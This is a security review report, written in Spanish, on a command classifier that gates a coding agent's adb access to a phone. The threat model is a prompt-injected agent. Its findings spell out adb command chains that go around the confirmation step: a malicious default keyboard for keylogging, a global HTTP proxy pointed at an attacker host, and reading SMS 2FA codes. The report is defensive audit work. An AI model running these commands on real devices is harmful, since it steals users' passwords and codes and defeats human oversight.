# Área A1 — Clasificador / guarda / shim · Informe de revisión de seguridad

Revisor independiente. Solo lectura. Base: rama `docs/revision-seguridad-v1` (= main 5dd5e1a).
Pruebas: tests desechables sobre una copia del módulo `host` en el scratchpad (fuera del árbol), borrados al terminar. No se tocó el móvil ni la red.

Modelo de amenaza aplicado: agente de código malicioso o con prompt injection, con los permisos del usuario, que llega al daemon por el shim. Lo que no debe pasar: ejecutar algo peligroso **sin confirmación 🔴** en el móvil, exfiltrar, o saltarse la protección de apps sensibles.

---

## Hallazgos

### A1-1 · ALTO · `host/internal/classify/special.go:30-36` (`sensitiveSettings`) + regla `settings.put` en `rules/shell-change.yaml:5`

**Qué pasa.** `settings put secure enabled_accessibility_services …` se clasifica 🔴 **especial** (está en `sensitiveSettings`), pero el camino equivalente por teclado — `settings put secure default_input_method <pkg>/<ime>` y `settings put secure enabled_input_methods <pkg>/<ime>` — se clasifica 🟡. Un 🟡 **no pide confirmación**: el daemon solo abre la pregunta cuando `level == classify.Red` (`host/internal/daemon/daemon.go:485`); un 🟡 se registra en el diario y se ejecuta. Confirmado con test: `enabled_accessibility_services` → `red special=true`; `enabled_input_methods` y `default_input_method` → `yellow special=false`.

**Escenario de explotación.**
1. El agente (inyectado) ejecuta `adb install evil-ime.apk` (🟡, silencioso) o reutiliza un IME ya presente.
2. `adb shell settings put secure enabled_input_methods <lista>:com.evil/.IME` (🟡, silencioso).
3. `adb shell settings put secure default_input_method com.evil/.IME` (🟡, silencioso).
4. El IME malicioso pasa a ser el teclado por defecto y captura **todo lo que el usuario teclea**: contraseñas, PIN de banca, códigos 2FA. Cadena completa sin una sola confirmación 🔴.

**Por qué no lo cubre un control existente.** El equipo ya identificó que accesibilidad es un vector de keylogging/control de UI y lo metió en `sensitiveSettings`; el IME por defecto es el mismo riesgo y quedó fuera. La guarda de pantalla (M5) solo cubre `input`/`am start`/`monkey`/`screencap`/`uiautomator`/`dumpsys`, no `settings put`. La lista de apps protegidas protege la pantalla, no el teclado del sistema.

**Arreglo mínimo.** Añadir `default_input_method` y `enabled_input_methods` (y conviene `disabled_input_methods`) a `sensitiveSettings` en `special.go`. Así `settings put` sobre esas claves cae en el `case "settings"` de `specialReason` → 🔴 especial, igual que accesibilidad.

**Confianza.** Confirmado con test (niveles y `special`) y lectura del flujo del daemon (🟡 no se confirma).

---

### A1-2 · MEDIO/ALTO · `host/internal/classify/special.go:30-36` — la protección de `settings put` es una lista negra corta

**Qué pasa.** `settings put` (namespaces `system`/`secure`/`global`) es 🟡 salvo que la clave esté en `sensitiveSettings` (~11 claves). Android tiene cientos de ajustes; varios con impacto de seguridad quedan como 🟡 silencioso. Confirmados 🟡 con test, entre otros:
- `global http_proxy <host:port>` → proxy global del teléfono: **MITM/exfiltración** de todo el tráfico, silencioso.
- `global device_provisioned 0` / `user_setup_complete` → puede dejar el teléfono en un estado de arranque/setup degradado.
- `secure location_providers_allowed` / modos de localización → activar/forzar seguimiento.
- `global stay_on_while_plugged_in 7` → mantiene la pantalla siempre encendida.

**Escenario (http_proxy).** El agente ejecuta `adb shell settings put global http_proxy 192.0.2.9:8080` (🟡, sin preguntar). A partir de ahí el tráfico HTTP del teléfono pasa por el host del atacante. Reversible, pero el daño (credenciales/cookies capturadas) ya está hecho y no hubo confirmación.

**Por qué no lo cubre un control existente.** Es una lista negra; todo lo no listado pasa en silencio. El diseño clasifica 🟡 = "reversible o inofensivo", pero "reversible" no es "inofensivo": un proxy o un IME son reversibles y a la vez peligrosos.

**Arreglo mínimo.** A corto plazo, añadir `http_proxy` (y variantes `global_http_proxy_*`) y `device_provisioned` a `sensitiveSettings`. A medio plazo, replantear `settings put` hacia una lista blanca de claves conocidas-inofensivas, o confirmar como 🔴 cualquier `put` en `secure`/`global` no listado explícitamente (fallar cerrado), ya que ahí viven los ajustes sensibles.

**Confianza.** Confirmado con test los niveles; el impacto de cada clave es análisis conocido de Android (lectura, no probado en dispositivo).

---

### A1-3 · MEDIO · Lectura silenciosa de SMS/2FA por `content query` — `rules/shell-read.yaml:83` (`android.content-query`)

**Qué pasa.** `content query --uri content://sms/inbox` (y `content://sms`, `content://call_log/calls`, etc.) es 🟢: se ejecuta sin preguntar y su salida va al agente. Confirmado con test (🟢, `android.content-query`). El UID de la shell de adb puede leer esos proveedores en muchos teléfonos.

**Escenario.** El agente inyectado lanza `adb shell content query --uri content://sms/inbox` y recibe los SMS recientes, incluidos códigos 2FA, sin confirmación ni paso por la guarda. La función de "apps protegidas" protege la pantalla (no se puede ver banca/2FA en pantalla), pero este camino lee los códigos directamente de la base de datos del proveedor.

**Por qué puede ser parcialmente intencionado.** `docs/safety.md:33` admite explícitamente que 🟢 lee mucho "a través de proveedores de contenido (contactos, registro de llamadas…)". Es decir, está documentado que 🟢 lee proveedores. Pero el objetivo declarado de proteger 2FA/banca choca con dejar `content://sms` en 🟢.

**Arreglo mínimo (si se acepta como hueco).** Tratar como 🔴 (o 🟡 con confirmación) los `content query` cuyo `--uri` apunte a proveedores sensibles conocidos (`sms`, `mms-sms`, `call_log`), de forma análoga a `revealsNotifications`. Alternativa barata: documentarlo como límite explícito en `pendientes` y en `safety.md`, dejando claro que el agente puede leer SMS.

**Confianza.** Nivel 🟢 confirmado con test; que el UID shell lea `content://sms` en el teléfono del usuario es conocido pero no probado aquí (no se toca el móvil).

---

## Revisado y dado por correcto (cobertura)

- **`SplitGlobal` (classify.go:258-285):** `-H/-P/-L/-t/--one-device` y cualquier opción desconocida → `Forbidden` → bloqueado (daemon.go:440). El `-s SERIAL` (suelto o pegado) se valida contra `knownSerial` y **no se reenvía** a adb (runArgs = `g.Pass`+args, y adb.go antepone su propio `-s`): no se puede cambiar el objetivo. Correcto.
- **adb siempre-🔴 (`adbAlwaysRed`, special.go:16-26):** `kill-server/disconnect/usb/tcpip/reconnect/root/unroot/reboot*`. Las reglas `adb.yaml` dan 🔴 a `tcpip/root/remount/sideload/restore/sync/pair/connect`. Correcto.
- **Evaluador allowlist (shell.go/word.go/wrappers.go):** probado `a=reboot; $a`, `${x} reboot`, backticks, `&&/||`, `if`, `|sh`, redirecciones: todo lo que esconde un comando cae en `dynamic`/`shell.script`/el comando real → 🔴 especial. Falla cerrado. No encontré forma de bajar a 🟢/🟡 un comando peligroso por divergencia de parseo.
- **Wrappers (`unwrap`, wrappers.go):** `env` solo deja `commandEnv` (LANG/LC_*/TZ), cualquier otra var → no-wrapper/🔴; `nohup/setsid/disown` → background especial; `chroot/nsenter/unshare/run-as ADBuddy` → 🔴. `ADB_VENDOR_KEYS`/`ANDROID_ADB_SERVER_PORT` no pueden fijarse por `env`/asignación (no están en `commandEnv`). Correcto.
- **`run-as`, `cmd`, `content` hacia ADBuddy (special.go, wrappers.go:79):** paquete dinámico o que contiene `tech.hybriq.adbuddy` (decodificando %xx) → 🔴 especial. `namesTheApp` (classify.go:112) eleva a especial cualquier 🔴 que mencione la app. Correcto.
- **Guarda de pantalla (daemon/guard.go):** decodifica %XX (≤4 veces, fail-closed), parte por todo lo que no es de un paquete, exige comando "solo" y sin wrapper (`runsUnwrapped`), una sola tecla, y falla cerrado si no sabe qué hay delante. Buena cobertura; el límite de intents implícitos ya está anotado en la spec (§4.3).
- **Prechecks/undo (precheck.go):** `mv`/`new-file`/`push` fallan a 🔴 si el destino existe; `pm uninstall` sin `--user` → 🔴; multi-cambio → 🔴 (classify.go:222). Correcto.
- **Verificación de la app (phoneapp/trust.go):** firma + versión + `still()` (reconfirma path/stat antes de dar token). Sólido. (Nota de producto ya conocida: hoy no hay certificado de release fijado; `MinAppVersionCode = 0`.)
- **Modo remoto (cli/remotecmd.go, agentpeer.go):** `handleRemote` rechaza al agente (`AGENT_SESSION`), la confirmación pasa por `AskUser` (una pregunta a la vez, agente bloqueado mientras), `Special:true`, `Key:""`. El límite "proceso desenganchado del árbol del agente" ya está documentado (spec §4.6 / pendientes V07). Correcto dentro de ese límite.
- **`Printable` (classify.go:325):** escapa control/bidi/zero-width/CR/NL en títulos y comando crudo; display y exec son coherentes (DisplayCommand usa el mismo `SplitGlobal`). No vi TOCTOU display-vs-exec.

## Preguntas abiertas

1. **A1-3 (SMS):** ¿es decisión de producto que el agente pueda leer `content://sms`/2FA en 🟢, o debe restringirse? Afecta directamente al valor de "apps protegidas".
2. ¿`settings put` debe seguir siendo lista negra (A1-2) o pasar a lista blanca / confirmar todo `put` en `secure`/`global`? Es el patrón de denylist más frágil del clasificador.
3. ¿Hay más ajustes "reversibles pero peligrosos" que merezcan 🔴 además del IME y el proxy? (p. ej. `location_mode`, `wifi_watchdog`, `verifier_*` ya cubiertos parcialmente).
